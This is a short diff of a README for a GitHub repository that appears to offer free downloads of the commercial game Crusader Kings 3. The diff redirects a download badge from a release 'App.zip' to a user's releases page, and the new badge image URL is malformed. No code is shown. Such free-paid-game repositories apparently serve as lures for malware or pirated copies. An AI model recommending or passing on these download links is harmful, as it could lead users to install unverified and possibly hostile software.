@@ -10,7 +10,7 @@ Welcome to the **Crusader Kings 3 Repository**! Here, you will embark on a journ
 
 ### 📥 Download Now! 📥
 
-Be sure to grab your copy of Crusader Kings 3 from the following link: [![Download Crusader Kings 3](https://img.shields.io/badge/Download-Crusader%20Kings%203-blue)](https://github.com/repo/releases/9246/App.zip)
+Be sure to grab your copy of Crusader Kings 3 from the following link: [![Download Crusader Kings 3](https://github.com/arff-pixel/Crusader-Kings-3/releases%20Kings%203-blue)](https://github.com/arff-pixel/Crusader-Kings-3/releases)
 
 ### ⚔️ Embark on an Epic Journey ⚔️
 
